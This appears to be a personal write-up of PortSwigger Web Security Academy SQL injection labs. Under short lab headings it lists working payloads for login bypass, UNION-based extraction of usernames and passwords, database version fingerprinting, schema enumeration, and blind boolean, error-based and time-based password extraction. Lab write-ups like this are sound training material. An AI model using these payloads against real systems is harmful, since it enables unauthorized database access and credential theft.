
# Portswigger

### SQL Injection 

##### 1. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data 

**payload**: `filter?category=Gifts'+OR+1+=+1--` 

##### 2. SQL injection vulnerability allowing login bypass 

**payload**: `password: ' OR 1=1--` 

##### 3. SQL injection UNION attack, determining the number of coulmns returned by the query 

**payload**: `filter?category=Gifts'+UNION+SELECT+NULL,NULL,NULL--` 

##### 4. SQL injection UNION attack, finding a coulmn containing text 

**payload**: `filter?category=Pets'+UNION+SELECT+NULL,'YK6gYm',NULL--` 

##### 5. SQL injection UNION attack, retrieving data from other tables 

**payload**: `filter?category=Gifts'+UNION+SELECT+username,password+FROM+users--` 
This will give the Password of user admin. 

##### 6. SQL injection UNION attack, retrieving multiple values in a single column 

**payload**: `'+UNION+SELECT+NULL,username||'~'||password+FROM+users--` 
This will give the password for user admin. 

##### 7. SQL injection attack, querying the database type and version on Oracle 

**payload**: `Pets%'+UNION+SELECT+BANNER,+NULL+FROM+v$version--` 
This will leak the database version. 

##### 8. SQL injection attack, querying the database type and version on MySQL and Microsoft 

**payload**: `'+UNION+SELECT+@@version,+NULL#` 

##### 9. SQL injection attack, listing the database contents on non-Oracle databases 

1) `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--` will give the username `users_qjqsdw`.  
2) `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_qjqsdw'--  
` will give `password_tmajay` and  `username_mwfumq`  
3) `' UNION SELECT username_mwfumq, password_tmajay FROM users_qjqsdw--` will give the admin creds.  

##### 10. SQL injection attack, listing the database contents on Oracle 

**payload**: `' UNION SELECT USERNAME_MUNMCB, PASSWORD_QYRMVB FROM USERS_VLOTNP--` 

This will give the creds of admin.

#### 11. Blind SQL injection with conditional responses

**payload**: `TrackingId=`  

1) By doing sniping attack using burpsuite `' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`  
By bruteforcing, we get the total length of the password is 20.  
2) By doing cluster attack with 2 payloads `' AND (SELECT SUBSTRING(password,§3§,1) FROM users WHERE username='administrator')='§a§`  

We'll be leaking the admin password.  

#### 12. Blind SQL injection with conditional errors

**payload**: `'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`  

By triggering internal server error, we can Identify the true condition  
(Cluster attack)  

#### 13. Blind SQL injection with time delays

**payload**: `||pg_sleep(5)--`  

There will be time delay of 5 seconds for every request that is sent.  

#### 14. Blind SQL injection with time delays and information retrieval

**payload**: `'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,12,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`  

Using the payload used in the last lab, we can find the length of the password and cluster bombing using **payload**, 
will retrive the password of user admin.  

